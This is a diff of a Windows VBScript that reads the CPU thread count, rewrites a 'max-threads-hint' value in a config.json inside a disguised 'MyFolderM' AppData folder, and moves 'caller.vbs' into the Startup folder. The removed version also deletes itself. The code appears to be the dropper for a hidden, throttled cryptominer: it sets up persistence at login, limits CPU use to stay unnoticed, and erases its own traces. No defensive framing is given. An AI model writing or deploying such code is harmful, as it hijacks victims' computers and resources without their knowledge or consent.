@@ -1,51 +1,56 @@
-Option Explicit
+' Detect CPU count
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+Set colItems = objWMIService.ExecQuery("Select * from Win32_Processor")
 
-Dim objFSO, objShell, objWMI, colProcessors, objProcessor
-Dim threads, maxThreads, jsonFile, jsonContent, startupFolder, callerVbsPath
+' Initialize CPU count
+CPUCount = 0
 
-Set objFSO = CreateObject("Scripting.FileSystemObject")
-Set objShell = CreateObject("WScript.Shell")
-Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
-
-Set colProcessors = objWMI.ExecQuery("Select * from Win32_Processor")
-For Each objProcessor In colProcessors
-    threads = objProcessor.NumberOfLogicalProcessors
-    Exit For
+' Loop through all processors to count them
+For Each objItem in colItems
+    CPUCount = objItem.NumberOfLogicalProcessors
 Next
 
-If IsEmpty(threads) Or threads = "" Then
-    MsgBox "Failed to detect CPU threads. Exiting."
+' If CPU count is 0, exit the script
+If CPUCount = 0 Then
+    WScript.Echo "Error: Unable to detect CPU count. Exiting."
     WScript.Quit
 End If
 
-maxThreads = Int(threads / 4)
-If maxThreads < 1 Then maxThreads = 1
+' Calculate 25% CPU usage
+MaxThreads = Int(CPUCount * 0.25)
 
-jsonFile = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\MyFolderM\config.json")
-startupFolder = objShell.SpecialFolders("Startup")
-callerVbsPath = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\MyFolderM\caller.vbs")  ' Path to caller.vbs
+' Update config.json with new max-threads-hint value
+configFilePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\MyFolderM\config.json")
 
-If Not objFSO.FileExists(jsonFile) Then
-    MsgBox "config.json not found in the current directory. Exiting."
+' Open config.json for reading and updating
+Set fso = CreateObject("Scripting.FileSystemObject")
+If fso.FileExists(configFilePath) Then
+    Set configFile = fso.OpenTextFile(configFilePath, 1)
+    configText = configFile.ReadAll
+    configFile.Close
+    
+    ' Replace the max-threads-hint value correctly
+    updatedText = Replace(configText, """max-threads-hint"": 100", """max-threads-hint"": " & MaxThreads)
+    
+    ' Write the updated config back to the file
+    Set configFile = fso.OpenTextFile(configFilePath, 2)
+    configFile.Write updatedText
+    configFile.Close
+Else
+    WScript.Echo "Error: config.json not found. Exiting."
     WScript.Quit
 End If
-
-Dim objFile, json
-Set objFile = objFSO.OpenTextFile(jsonFile, 1, False)
-jsonContent = objFile.ReadAll
-objFile.Close
-
-jsonContent = Replace(jsonContent, """max-threads-hint"": 100", """max-threads-hint"": " & maxThreads)
-
-Set objFile = objFSO.OpenTextFile(jsonFile, 2, False)
-objFile.Write jsonContent
-objFile.Close
 
 ' Move caller.vbs to the Startup folder
-If objFSO.FileExists(callerVbsPath) Then
-    objFSO.MoveFile callerVbsPath, startupFolder & "\caller.vbs"
-End If
+startupFolder = CreateObject("WScript.Shell").SpecialFolders("Startup")
+callerVbsPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\MyFolderM\caller.vbs")
 
-Dim selfPath
-selfPath = WScript.ScriptFullName
-CreateObject("Scripting.FileSystemObject").DeleteFile selfPath
+' Check if caller.vbs exists
+If fso.FileExists(callerVbsPath) Then
+    ' Move caller.vbs to the Startup folder
+    fso.MoveFile callerVbsPath, startupFolder & "\caller.vbs"
+    WScript.Echo "caller.vbs moved to Startup folder."
+Else
+    WScript.Echo "Error: caller.vbs not found. Exiting."
+    WScript.Quit
+End If
